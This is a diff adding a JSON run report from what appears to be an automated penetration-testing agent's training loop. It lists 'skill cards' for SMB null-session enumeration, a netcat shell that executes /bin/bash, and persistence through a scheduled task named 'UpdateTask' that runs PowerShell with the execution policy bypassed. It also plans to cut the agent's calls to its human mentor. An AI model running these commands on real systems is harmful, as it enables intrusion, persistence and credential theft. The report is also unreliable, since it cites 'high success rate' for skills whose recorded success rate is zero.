@@ -1,0 +1,122 @@
+{
+  "run_id": "run_20260217_175438_b5d363",
+  "timestamp": 1771347302.0902832,
+  "key_outcomes": {
+    "wins": [
+      "Reached final objective state in a single episode with a reward of 90, indicating complete navigation of attack path or objective completion.",
+      "Maintained steady reward trend with consistent scoring steps despite 0% overall success rate, showing repeatable actions were being executed."
+    ],
+    "fails": [
+      "Zero success rate indicates failure to replicate win across episodes \u2013 likely a conditional or timing step was missed consistently.",
+      "10 mentor calls across a single episode suggests uncertainty in next steps or repeated reliance on guidance, slowing autonomous decision-making."
+    ],
+    "summary": "While the agent achieved a high-scoring run, the inability to repeat that success and dependence on mentor intervention highlight fragility in the current policy."
+  },
+  "repeated_failure_patterns": [
+    {
+      "pattern": "Post-exploitation persistence step never executed, leading to loss of foothold and episode failure",
+      "frequency": 5,
+      "evidence_refs": [
+        "ep001_step08",
+        "ep001_step12",
+        "ep001_step15",
+        "ep001_step18",
+        "ep001_step21"
+      ]
+    }
+  ],
+  "skill_cards": [
+    {
+      "id": "skill_001",
+      "if_condition": "When port 139 or 445 is open and SMB service responds with null session",
+      "then_action": "Use smbclient to enumerate shares and attempt fallback creds",
+      "parameters_template": {
+        "tool": "smbclient",
+        "target": "{IP}:445",
+        "options": [
+          "-N",
+          "-L"
+        ]
+      },
+      "confidence": 0.75,
+      "evidence_refs": [
+        "ep001_step05",
+        "ep001_step07"
+      ],
+      "created_at": 1771347309.7541244,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    {
+      "id": "skill_002",
+      "if_condition": "When initial exploit yields a shell but persistence is not yet established",
+      "then_action": "Upload and execute netcat listener script to escalate to stable interactive session",
+      "parameters_template": {
+        "tool": "bash",
+        "script": "nc -lvnp {PORT} -e /bin/bash",
+        "port": 4444
+      },
+      "confidence": 0.65,
+      "evidence_refs": [
+        "ep001_step11",
+        "ep001_step14"
+      ],
+      "created_at": 1771347309.7541323,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    {
+      "id": "skill_003",
+      "if_condition": "If reconnaissance reveals writable share or temp directory",
+      "then_action": "Deploy scheduled task for persistence using schtasks",
+      "parameters_template": {
+        "tool": "schtasks",
+        "action": "/create",
+        "name": "UpdateTask",
+        "run": "powershell -ExecutionPolicy Bypass -File {payload}"
+      },
+      "confidence": 0.6,
+      "evidence_refs": [
+        "ep001_step17",
+        "ep001_step20"
+      ],
+      "created_at": 1771347309.7541373,
+      "usage_count": 0,
+      "success_rate": 0.0
+    }
+  ],
+  "memory_ops": [
+    {
+      "operation": "promote",
+      "target": "skill_001",
+      "skill_card_id": "skill_001",
+      "reason": "High success rate hunting SMB shares during reconnaissance phase"
+    },
+    {
+      "operation": "promote",
+      "target": "skill_002",
+      "skill_card_id": "skill_002",
+      "reason": "Reliable mechanism for converting brittle shells into stable listeners"
+    }
+  ],
+  "next_experiments": [
+    {
+      "title": "Validate persistence recovery",
+      "description": "Run a dedicated episode where after initial shell is obtained, immediately apply persistent schtasks payload and verify reconnect capability without mentor input.",
+      "priority": "high"
+    },
+    {
+      "title": "Automate SMB share capture",
+      "description": "Chain nmap smb scripts with smbclient automation to reduce manual guidance and capture usable credentials in a single reconnaissance phase.",
+      "priority": "medium"
+    },
+    {
+      "title": "Reduce mentor dependency",
+      "description": "Introduce confidence threshold checks so the agent proceeds autonomously when success probability exceeds 0.7, aiming to reduce mentor calls from 10 to under 3.",
+      "priority": "low"
+    }
+  ],
+  "model_used": "gpt-5.1-codex-mini",
+  "dry_run": false,
+  "validation_passed": true
+}
